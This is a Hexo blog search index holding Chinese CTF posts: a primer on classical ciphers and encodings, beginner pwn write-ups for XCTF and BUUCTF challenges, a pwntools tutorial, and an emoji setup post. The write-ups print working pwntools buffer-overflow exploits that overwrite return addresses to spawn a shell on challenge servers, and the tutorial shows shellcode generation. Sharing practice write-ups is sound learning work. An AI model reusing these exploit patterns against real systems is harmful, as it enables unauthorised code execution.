<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>烧脑的密码——花里胡哨</title>
      <link href="/2020/04/02/crypto/"/>
      <url>/2020/04/02/crypto/</url>
      
        <content type="html"><![CDATA[<p>最近学习pwn，又累又自闭=_=我觉得还得抓抓crypto才行，主打pwn，副业crypto，perfect ！！😊</p><p>这篇博文就对crypto做个小总结吧，会不定时的更新，毕竟现在学的也不都多，学无止境哈哈哈；</p><a id="more"></a><h1 id="16进制—-gt-文本"><a href="#16进制—-gt-文本" class="headerlink" title="16进制—>文本"></a>16进制—&gt;文本</h1><p>这个是我做题以来，用到的最多的一种</p><p>解密网站1：<a href="http://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">16进制文本转换</a>   </p><p>解密网站2：<a href="https://www.sojson.com/hexadecimal.html" target="_blank" rel="noopener">16进制文本转换</a></p><h1 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h1><p>先来个简单的Base加密</p><p>Base是一个大家族，有Base16，Base32，Base64…多种加密，常用的是Base64加密，通常Base64有个特征：</p><p>由于它的加密方法问题，常常以 <code>"= ="</code> 结尾</p><p>解密网站：<a href="http://tool.chinaz.com/Tools/Base64.aspx" target="_blank" rel="noopener">Base64</a> </p><h1 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h1><p>摩斯密码，很多人都听说过吧应该，就是由 <code>"."</code> 和 <code>"-"</code> 组成</p><p>e.g.    <code>-.-./-/..-.</code>  ——&gt;  <code>CTF</code></p><p>解密网站：<a href="https://tool.lu/morse/" target="_blank" rel="noopener">Morse</a></p><h1 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h1><p>凯撒密码，这个原理也很简单，就是每一个字母往后移动相同的位数</p><p>解密网站： <a href="https://www.qqxiuzi.cn/bianma/kaisamima.php" target="_blank" rel="noopener">Caesar</a></p><h1 id="ROT13"><a href="#ROT13" class="headerlink" title="ROT13"></a>ROT13</h1><p>ROT13，每个字母回转13位</p><p>解密网站：<a href="https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html" target="_blank" rel="noopener">ROT13</a> </p><h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>md5，这个不好解释，直接放网站吧</p><p>解密网站：<a href="https://pmd5.com/" target="_blank" rel="noopener">MD5</a></p><h1 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h1><p>培根密码，由<code>A(a)</code>，<code>B(b)</code>组成，代表的是数学中的0和1</p><p>解密网站：<a href="https://tool.bugku.com/peigen/" target="_blank" rel="noopener">培根密码</a></p><h1 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h1><p>栅栏密码，把明文分为N个一组，把每一组的第一个字符组合，第二个字符组合…第N个字符组合，然后连起来就</p><p>是一段栅栏密码了</p><p>e.g.   （以2栏栅栏为例：）</p><pre><code>明文：I Love CTF 去空格：ILoveCTF分组：IL ov eC TF第一组：IoeT第二组：LvCF密文：IoeTLvCF</code></pre><p>解密网站：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">栅栏密码</a>   </p><p>还有一种栅栏密码叫做<code>W型栅栏密码</code> 解密网站：<a href="http://www.atoolbox.net/Tool.php?Id=777" target="_blank" rel="noopener">W型栅栏密码</a></p><h1 id="Ook-amp-Brainfuck"><a href="#Ook-amp-Brainfuck" class="headerlink" title="Ook &amp; Brainfuck"></a>Ook &amp; Brainfuck</h1><p>Ook，这个很有意思😂，形如：<code>Ook. Ook! Ook?</code> 这样的就是Ook加密</p><p>Brainfuck，这个也很有意思，形如：<code>++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .---- .&lt;+++ ++++[</code></p><p>这样的就是Brainfuck加密😁</p><p>解密网站： <a href="https://tool.bugku.com/brainfuck/?wafcloud=1" target="_blank" rel="noopener">Ook &amp; Brainfuck</a> </p><h1 id="quipqiup"><a href="#quipqiup" class="headerlink" title="quipqiup"></a>quipqiup</h1><p>quipqiup，这个是把一段英文，每个字母替换为另一个指定的字母的加密</p><p>解密网站：<a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a> </p><h1 id="与佛论禅"><a href="#与佛论禅" class="headerlink" title="与佛论禅"></a>与佛论禅</h1><p>这个没什么好解释的</p><p>解密网站：</p><p><a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a></p><p><a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">新约佛论禅</a></p><h1 id="键盘密码"><a href="#键盘密码" class="headerlink" title="键盘密码"></a>键盘密码</h1><p>键盘密码，更没法说，把密文在键盘上找到位置，有时候连成的轨迹是一个字母，有时候是围着一个字母</p><p>还有手机9键密码，比如666，就是键盘”6“上的第三个字母”O“ …根据情况定吧，变化很多~</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>这里放一些不知道原理，只会根据题目来解的加密：</p><p><a href="https://www.sojson.com/encrypt_aes.html" target="_blank" rel="noopener">AES</a>  <a href="https://www.sojson.com/encrypt_rabbit.html" target="_blank" rel="noopener">Rabbit</a>  <a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">serpent</a>   <a href="http://web.chacuo.net/charsetquotedprintable" target="_blank" rel="noopener">Quoted-printable</a>   <a href="http://code.mcdvisa.com" target="_blank" rel="noopener">中文电码</a> </p><h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><p><a href="http://www.atoolbox.net/Category.php?Id=27" target="_blank" rel="noopener">加密解密工具</a></p><p><a href="https://blog.csdn.net/weixin_42037232/article/details/89018997?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">密码积累网站</a></p><p><a href="https://www.sojson.com/qr/deqr.html" target="_blank" rel="noopener">二维码</a></p><p><a href="https://app.xunjiepdf.com/pdf2word/" target="_blank" rel="noopener">PDF转-&gt;**</a></p><p><a href="http://ctf.ssleye.com/?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">CTF在线工具</a></p><p><a href="https://www.ctftools.com/down/" target="_blank" rel="noopener">CTF资源库</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF——WP</title>
      <link href="/2020/03/30/xctf/"/>
      <url>/2020/03/30/xctf/</url>
      
        <content type="html"><![CDATA[<p>这篇博客呢，就记录一些平时在XCTF刷的题目的wp，可能整理不开，会分支放；</p><a id="more"></a><h1 id="Hello-pwn"><a href="#Hello-pwn" class="headerlink" title="Hello_pwn"></a>Hello_pwn</h1><p>这个算是第一篇wp了吧，不足之处，还请多多指教；</p><p>拿到题目，按照惯例，先查看保护机制：</p><p><img src="/images/hello_pwn_1.png" alt="hello_pwn_1"></p><p>可以看到，开了NX，未开canary，丢进ida查看伪代码：</p><p><img src="/images/hello_pwn_2.png" alt="hello_pwn_2"></p><p>可以看到这里，先读取一个字符串，再判断如果dword = 1853186401，执行下面那个函数，点进去看：</p><p><img src="/images/hello_pwn_3.png" alt="hello_pwn_3"></p><p>这里直接给了flag了，思路就清晰了吧：只要让<code>dword</code> = 1853186401就可以了</p><p>但是读取的是<code>unk</code>，判断的确是<code>dword</code>，那就看看它们的关系：</p><p><img src="/images/hello_pwn_4.png" alt="hello_pwn_4"></p><p>可以看到，unk和dword偏移量是4个字节，这就好办了呀😁</p><p>直接看exp吧：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>a <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'111.198.29.45'</span><span class="token punctuation">,</span><span class="token number">49503</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1853186401</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"lets get helloworld for bof"</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就做出来了，\(●ˇ∀ˇ●)/</p><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>这道题题目也给出了，考察的ROP，算是很简单的一道题了；</p><p>先查看保护机制：</p><p><img src="/images/level2_1.png" alt="level2_1"></p><p>开了NX，没有canary</p><p>丢进ida，查看伪代码：</p><p><img src="/images/level2_2.png" alt="level2_2"></p><p>点进vulnerable_function()函数，查看一波：</p><p><img src="/images/level2_3.png" alt="level2_3"></p><p>这里我们发现，read函数极易造成栈溢出漏洞，点进buf，查看空间分配：</p><p><img src="/images/level2_4.png" alt="level2_4"></p><p>这里有buf长度 = （0x88 + 0x4）</p><p>然后搜索字符串，发现”/bin/sh” ,点击进去：</p><p><img src="/images/level2_5.png" alt="level2_5"></p><p>这里就应该清楚了，利用栈溢出漏洞，构造payload覆盖到”/bin/sh”，直接获取shell，那么还得需要寻找system的地址，再寻找一波：</p><p><img src="/images/level2_6.png" alt="level2_6"></p><p>到这里就全部清楚了，上exp：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>a <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'111.198.29.45'</span><span class="token punctuation">,</span><span class="token number">54298</span><span class="token punctuation">)</span>bin_sh <span class="token operator">=</span> <span class="token number">0x0804A024</span>system <span class="token operator">=</span> <span class="token number">0x08048320</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">0x4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>a<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这道题就做完了，嘻嘻嘻~😀</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
            <tag> Pwn </tag>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF——WP</title>
      <link href="/2020/03/30/buuctf/"/>
      <url>/2020/03/30/buuctf/</url>
      
        <content type="html"><![CDATA[<p>上一篇写的是XCTF的wp，那这篇博客，就记录一些在BUUCTF刷题的wp；</p><a id="more"></a><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>这道题拿过来，还是先看保护机制：</p><p><img src="/images/rip_1.png" alt="rip_1"></p><p>这、这、这个什么保护都没开😂，看样子不难，丢进ida查看伪代码：</p><p><img src="/images/rip_2.png" alt="rip_2"></p><p>这个意思就是，先读取一个字符串，然后输出这个字符串，然后就没有啦；</p><p>再看有个fun()函数，点进去：</p><p><img src="/images/rip_3.png" alt="rip_3"></p><p>这里可以看出，如果控制gets函数，使得输入的字符串，覆盖到fun()函数即可获取shell，这里fun()函数的地址也给了出来，直接利用；</p><p>用它之前还得计算偏移量：</p><p><img src="/images/rip_4.png" alt="rip_4"></p><p>偏移量 = （0xF + 0x8）= 0x17</p><p>这样就可以了，上exp：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26706</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">23</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401186</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>nice~~  （￣︶￣）↗　</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
            <tag> BUUCTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn从入门到放弃</title>
      <link href="/2020/03/27/pwn-cong-ru-men-dao-fang-qi/"/>
      <url>/2020/03/27/pwn-cong-ru-men-dao-fang-qi/</url>
      
        <content type="html"><![CDATA[<p>我是一名CTF小白，主学习pwn，初学不久，几乎刚入门，现在说说如何“从入门到放弃”：</p><a id="more"></a><h1 id="pwntools的介绍"><a href="#pwntools的介绍" class="headerlink" title="pwntools的介绍"></a>pwntools的介绍</h1><p>首先需要学习的是pwntools，这个也是我刚开始入门就学的东西；那么先来了解一下pwntools：</p><h3 id="什么是pwntools？"><a href="#什么是pwntools？" class="headerlink" title="什么是pwntools？"></a>什么是pwntools？</h3><p>pwntools是一个二进制利用框架，是CTF框架和漏洞利用开发库，用Python开发，能够更快速的编写exp；</p><p>emm这样可能不好理解，简单来讲，就是Python的一个库，在Linux下使用；</p><h3 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h3><p>先来说说怎么安装吧：</p><h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><p>现在大多数人都是使用Windows或者Mac，但是pwntools需要安装在Linux环境中，这里推荐使用虚拟机；</p><p>虚拟机也有很多种，推荐使用VMware，我也给大家准备好了，点击这里下载<a href="https://pan.baidu.com/s/1t2psjlLidp00Cf1k3_-EQQ" target="_blank" rel="noopener">VMware15</a>  提取码：4nu6；当然肯</p><p>定需要镜像，点击这里下载<a href="https://pan.baidu.com/s/1DXDk2uRe4CprrkUqmWbeOA" target="_blank" rel="noopener">Ubuntu16.04</a>  提取码：az58；这个镜像是64位的，当然也可以去官网下载32位的，</p><p>看自己需要吧；       // 如果遇到问题，请联系我，首页有我的联系方式，嘿嘿嘿，随时可以call我；</p><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><p>安装pwntools需要下面几个环境：</p><p><strong>python</strong></p><p><strong>pip</strong></p><p><strong>libssl-dev</strong></p><p><strong>libffi-dev</strong></p><h4 id="pwntools的安装"><a href="#pwntools的安装" class="headerlink" title="pwntools的安装"></a>pwntools的安装</h4><p>安装需要以下几步：</p><p><strong><em>sudo apt-get install libffi-dev</em></strong><br><strong><em>sudo apt-get install libssl-dev</em></strong><br><strong><em>sudo apt-get install python</em></strong><br><strong><em>sudo apt-get install python-pip</em></strong><br><strong><em>sudo pip install pwntools</em></strong><br>注：安装过程可能会有更新pip等的提示，按照提示一步一步走就没问题，有问题请联系我；</p><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>安装完后，打开终端，输入<strong>python</strong>进入<strong>python</strong>命令，然后输入<strong><u>from pwn import *</u></strong> ，不报错即成功；</p><h3 id="pwntools的简单使用"><a href="#pwntools的简单使用" class="headerlink" title="pwntools的简单使用"></a>pwntools的简单使用</h3><p>前面提到，pwntools是python的一个库，那么在写exp的时候，需要掌握以下几个基本语法：</p><h4 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>a <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'ip'</span><span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#a = process("./文件名")</span>a<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通常来说，基本框架就这么多，但是远远不止，慢慢学；</p><p>下面介绍这些语句是什么意思</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token comment" spellcheck="true">#导入pwntools模块</span>remote<span class="token punctuation">(</span><span class="token string">'ip'</span><span class="token punctuation">,</span>port<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#远程连接</span>process<span class="token punctuation">(</span><span class="token string">'./文件名'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#本地连接</span>recvn<span class="token punctuation">(</span>N<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#接受N(数字)字符</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#接收一行输出</span>recvlines<span class="token punctuation">(</span>N<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#接收N(数字)行输出</span>recvuntil<span class="token punctuation">(</span>some_string<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#接收到some_string为止</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#发送payload</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#发送payload并进行换行（末尾\n）</span>sendafter<span class="token punctuation">(</span>some_string<span class="token punctuation">,</span> payload<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#接收到some_string后,发送你的 payload</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#回显</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>基本框架就这些，再来看其他的：</p><h4 id="Context设置"><a href="#Context设置" class="headerlink" title="Context设置"></a>Context设置</h4><p>context是pwntools用来设置环境的；二进制文件情况特殊，我们可能需要设置一些环境才可以正常运行exp，不然可能会出现错误；</p><pre class="line-numbers language-python"><code class="language-python">context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：</p><p>1、os设置系统为Linux，因为pwntools需要在Linux中运行；</p><p>2、arch = ‘amd64/i386’，分别表示程序是64位和32位；</p><p>3、log_level=’debug’,这句话一般调试的时候会加上，这样会看到程序运行完整的过程；</p><h4 id="数据打包"><a href="#数据打包" class="headerlink" title="数据打包"></a>数据打包</h4><p>数据打包就是将一个整数值转换成32位或者64位地址一样的表示方式，构造payload的时候非常方便，其用法如下：</p><p>● p32/p64：打包一个整数，转换成 32位或者64位</p><p>● u32/u64：解包一个字符串，变成一个整数</p><h4 id="ELF模块"><a href="#ELF模块" class="headerlink" title="ELF模块"></a>ELF模块</h4><p>ELF模块用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很</p><p>相似。用法如下：</p><pre class="line-numbers language-python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./文件名'</span><span class="token punctuation">)</span>put_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'put'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#函数地址</span>put_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'put'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#GOT表的地址</span>put_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'put'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#PLT表的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="shellcode生成器"><a href="#shellcode生成器" class="headerlink" title="shellcode生成器"></a>shellcode生成器</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="检查-elf的安全性"><a href="#检查-elf的安全性" class="headerlink" title="检查.elf的安全性"></a>检查.elf的安全性</h1><p>通常拿到一个.elf文件后，首先对它进行检查，具体方法如下：</p><pre class="line-numbers language-bash"><code class="language-bash">$ checksec .elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表；</p><p>Stack：如果栈中开启了Canary found，就不能通过直接溢出的方法覆盖栈中的访问地址，需要绕过</p><p>NX：NX enabled，如果这个保护开启就是意味着栈中的数据没有执行权限，但是可以利用rop绕过</p><p>PIE：PIE enabled，如果程序开启这个地址随机化选项，那么意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话就是No PIE (address)，括号内的数据就是程序的基地址 </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>emoji的一些使用</title>
      <link href="/2020/03/27/emoji/"/>
      <url>/2020/03/27/emoji/</url>
      
        <content type="html"><![CDATA[<p>之前看堆堆的blog有emoji，感觉能给博客增加一份光彩，我也整个一个；嘿嘿嘿 <del>\(^o^)/</del>😂</p><a id="more"></a><p>首先来配置一个插件：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">npm</span> <span class="token function">install</span> hexo-filter-github-emojis --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在Hexo的根目录下的<code>_config.yml</code>中，新增一下的配置项：</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">githubEmojis</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">className</span><span class="token punctuation">:</span> github<span class="token punctuation">-</span>emoji  <span class="token key atrule">inject</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">styles</span><span class="token punctuation">:</span>  customEmojis<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样之后，就可以输入：：（中间填写英文），就能打出来表情</p><p>但是吧，似乎blog有点问题，用：：打出来的和copy的不一样：</p><p><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8">😄</span>  这个是：smile：的</p><p>😄  这个是直接 copy 的 smile</p><p>以后还是直接copy比较好😊</p><p>·</p><p>·</p><p>不得不说，今天才发现微软的输入法真的好用，emoji和颜文字都很方便，看来要从sougou转过来了(●ˇ∀ˇ●)</p><p>下面贴几个emoji  ○( ＾ω＾)っHiahiahia…(●ˇ∀ˇ●) ノ</p><p>😀 😘 😍 😁 😜 😄 😝 😉 🤩 😆</p><p>👈 👉 ✌ 🤞 🤙 🖐 👌 👍 ✍ 👐 💪</p><p>👨 👩 🧑 👧 👦  🧒  👶 👵 👴 🧓</p><p>🍕 🍔 🍟 🌭 🥓 🥞  🥙 🥪  🎂 🧀</p><p>⚽ 🏀 🎱 ⚾ 🏐 🎳 🏉  🏈 🥌 🎯</p><p>🎆 🎇 ✨ 🎉 🎊  🎃 🎄  🎋  🎍 🎑</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 花里胡哨 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> emoji </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届BJDCTF——WP</title>
      <link href="/2020/03/23/bjd-wp/"/>
      <url>/2020/03/23/bjd-wp/</url>
      
        <content type="html"><![CDATA[<p>历经36小时的第二届BJDCTF终于结束了，现在距离21点还差不到半小时，正好可以写完就上线，美滋滋；</p><a id="more"></a><h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><p>这次的比赛，算是学到了许多知识，黄老师说得对—不能不学习；</p><p>先看看这个比赛个人成绩吧（惨不忍睹）：</p><table><thead><tr><th align="center">Pwn</th><th align="center">Web</th><th align="center">Misc</th><th align="center">Crypto</th><th align="left">reverse</th><th align="center">Blockchain</th><th align="center">Programming</th><th align="center">Total</th></tr></thead><tbody><tr><td align="center"><strong>2/11</strong></td><td align="center"><strong>0/10</strong></td><td align="center"><strong>3/8</strong></td><td align="center"><strong>6/8</strong></td><td align="left"><strong>1/3</strong></td><td align="center"><strong>0/2</strong></td><td align="center"><strong>0/1</strong></td><td align="center"><strong>12/43</strong></td></tr></tbody></table><p>真的是，技术不行，尽力做了已经；接下来把我做出来的整理一下：</p><p><strong><em>说明一下，因为打比赛的时候没有及时整理记录，正好校外赛在BUU，所以用了里面的题目写这篇Blog</em></strong></p><p><strong><em>注：想刷题、想提高，就上<a href="https://buuoj.cn" target="_blank" rel="noopener">BUUCTF</a> // 绝对没打广告 ^_^</em></strong></p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="r2t3"><a href="#r2t3" class="headerlink" title="r2t3"></a>r2t3</h3><p>这是一道简单的栈溢出的题目，下载附件，检查一波：</p><p><img src="/images/r2t3_1.png" alt="r2t3_1"></p><p>32位程序，开了NX，放进ida：</p><p><img src="/images/r2t3_2.png" alt="r2t3_2"></p><p>这程序很简单，输入一个姓名，然后进入name_check()函数，点开函数来看：</p><p><img src="/images/r2t3_3.png" 